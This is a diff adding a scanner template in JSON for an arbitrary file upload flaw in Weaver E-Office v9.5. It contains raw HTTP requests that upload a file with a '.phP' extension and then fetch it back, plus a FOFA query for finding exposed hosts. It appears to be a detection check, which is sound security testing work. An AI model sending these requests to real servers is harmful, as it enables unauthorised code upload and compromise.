@@ -1,0 +1,143 @@
+{
+  "id": "weaver-eoffice-file-upload",
+  "name": "Weaver E-Office v9.5 - Arbitrary File Upload",
+  "author": "princechaddha",
+  "severity": "HIGH",
+  "description": "Weaver E-Office version 9.5 is susceptible to an arbitrary file upload vulnerability. This flaw allows malicious actors to upload and execute arbitrary code or files without proper validation or authorization.\n",
+  "references": [
+    "https://github.com/RCEraser/cve/blob/main/Weaver.md"
+  ],
+  "tags": [
+    "e-office",
+    "weaver",
+    "intrusive",
+    "file-upload"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"泛微-EOffice\""
+  },
+  "variables": {
+    "filename": [
+      "{{rand_base(7, \"abc\")}}"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /E-mobile/App/Ajax/ajax.php?action\u003dmobile_upload_save  HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: multipart/form-data; boundary\u003d----WebKitFormBoundarydRVCGWq4Cx3Sq6tt\n\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\nContent-Disposition: form-data; name\u003d\"upload_quwan\"; filename\u003d\"{{filename}}.phP\"\nContent-Type: image/jpeg\n\n{{randstr}}\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\nContent-Disposition: form-data; name\u003d\"file\"; filename\u003d\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--\n",
+        "GET /attachment/{{id}}/{{filename}}.phP HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body_2",
+          "values": [
+            "{{randstr}}"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "weaver-eoffice-file-upload",
+    "info": {
+      "name": "Weaver E-Office v9.5 - Arbitrary File Upload",
+      "author": "princechaddha",
+      "severity": "high",
+      "description": "Weaver E-Office version 9.5 is susceptible to an arbitrary file upload vulnerability. This flaw allows malicious actors to upload and execute arbitrary code or files without proper validation or authorization.\n",
+      "reference": [
+        "https://github.com/RCEraser/cve/blob/main/Weaver.md"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 2,
+        "fofa_query": "app\u003d\"泛微-EOffice\""
+      },
+      "tags": "e-office,weaver,intrusive,file-upload"
+    },
+    "variables": {
+      "filename": "{{rand_base(7, \"abc\")}}"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /E-mobile/App/Ajax/ajax.php?action\u003dmobile_upload_save  HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: multipart/form-data; boundary\u003d----WebKitFormBoundarydRVCGWq4Cx3Sq6tt\n\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\nContent-Disposition: form-data; name\u003d\"upload_quwan\"; filename\u003d\"{{filename}}.phP\"\nContent-Type: image/jpeg\n\n{{randstr}}\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\nContent-Disposition: form-data; name\u003d\"file\"; filename\u003d\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--\n",
+          "GET /attachment/{{id}}/{{filename}}.phP HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body_2",
+            "words": [
+              "{{randstr}}"
+            ],
+            "case_insensitive": false
+          }
+        ],
+        "extractors": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "\\\\\\/attachment\\\\\\/([0-9]+)\\\\\\/"
+            ],
+            "group": 1,
+            "name": "id",
+            "internal": true
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
